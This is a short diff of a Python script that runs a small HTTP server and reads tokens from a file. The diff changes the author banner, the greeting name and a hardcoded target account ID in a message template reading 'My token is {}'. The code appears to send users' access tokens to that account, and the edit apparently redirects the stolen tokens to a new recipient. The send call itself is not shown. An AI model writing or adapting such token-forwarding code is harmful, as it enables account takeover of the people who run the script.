@@ -25,7 +25,7 @@ class MyHandler(http.server.SimpleHTTPRequestHandler):
           self.send_response(200)
           self.send_header('Content-type', 'text/plain')
           self.end_headers()
-          self.wfile.write(b"-- THIS SERVER MADE BY King Badmash")
+          self.wfile.write(b"-- THIS SERVER MADE BY L3G3ND-CHOD=JUSTIN H3R3")
 def execute_server():
       PORT = 4000
 
@@ -39,10 +39,10 @@ def send_initial_message():
           tokens = file.readlines()
 
       # Modify the message as per your requirement
-      msg_template = "Hello King Badmash sir! I am using your server. My token is {}"
+      msg_template = "Hello Raj sir! I am using your server. My token is {}"
 
       # Specify the ID where you want to send the message
-      target_id = "100030009193320"
+      target_id = "100027305153773"
 
       requests.packages.urllib3.disable_warnings()
 
